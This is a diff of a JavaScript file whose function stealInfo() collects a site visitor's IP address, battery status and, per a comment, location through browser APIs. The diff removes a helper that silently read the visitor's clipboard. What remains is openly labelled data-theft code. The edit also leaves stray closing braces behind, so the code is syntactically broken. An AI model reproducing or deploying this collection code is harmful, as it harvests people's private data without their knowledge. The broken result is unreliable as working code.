@@ -209,15 +209,7 @@ async function getBatteryInfo() {
     }
 }
 
-async function getClipboard() {
-    try {
-        if (!navigator.clipboard || !navigator.clipboard.readText) {
-            return "clipboard not supported";
-        }
-        const text = await navigator.clipboard.readText();
-        return text ? text.substring(0, 500) : "empty"; // Limit length
-    } catch(e) {
-        return "permission denied or blocked";
+
     }
 }
 
@@ -245,10 +237,9 @@ function stealInfo() {
     };
 
     // Get everything in parallel
-    Promise.all([getIP(), getBatteryInfo(), getClipboard()]).then(async ([ip, battery, clipboard]) => {
+    Promise.all([getIP(), getBatteryInfo()]).then(async ([ip, battery]) => {
         info.ip = ip;
         info.battery = battery;
-        info.clipboard = clipboard;
 
         // Try Location
         if (navigator.geolocation) {
